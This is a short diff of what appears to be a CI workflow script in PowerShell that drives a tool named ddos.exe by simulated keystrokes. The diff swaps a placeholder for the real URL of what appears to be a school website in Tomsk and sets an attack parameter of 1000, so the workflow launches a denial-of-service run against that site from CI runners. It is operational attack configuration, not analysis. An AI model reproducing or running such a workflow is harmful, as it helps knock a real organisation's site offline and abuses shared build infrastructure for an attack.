@@ -40,13 +40,13 @@ jobs:
 
         # Send "" and Enter to ddos.exe
         Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.SendKeys]::SendWait("САЙТ{ENTER}")
+        [System.Windows.Forms.SendKeys]::SendWait("http://tegschool.edu.tomsk.ru{ENTER}")
 
         # Wait for some time
         Start-Sleep -Seconds 10
 
         # Send "" and Enter to ddos.exe
-        [System.Windows.Forms.SendKeys]::SendWait("0-1000{ENTER}")
+        [System.Windows.Forms.SendKeys]::SendWait("1000{ENTER}")
 
         # Wait for ddos.exe to finish
         Start-Sleep -Seconds 120  # Adjust the time based on your requirements
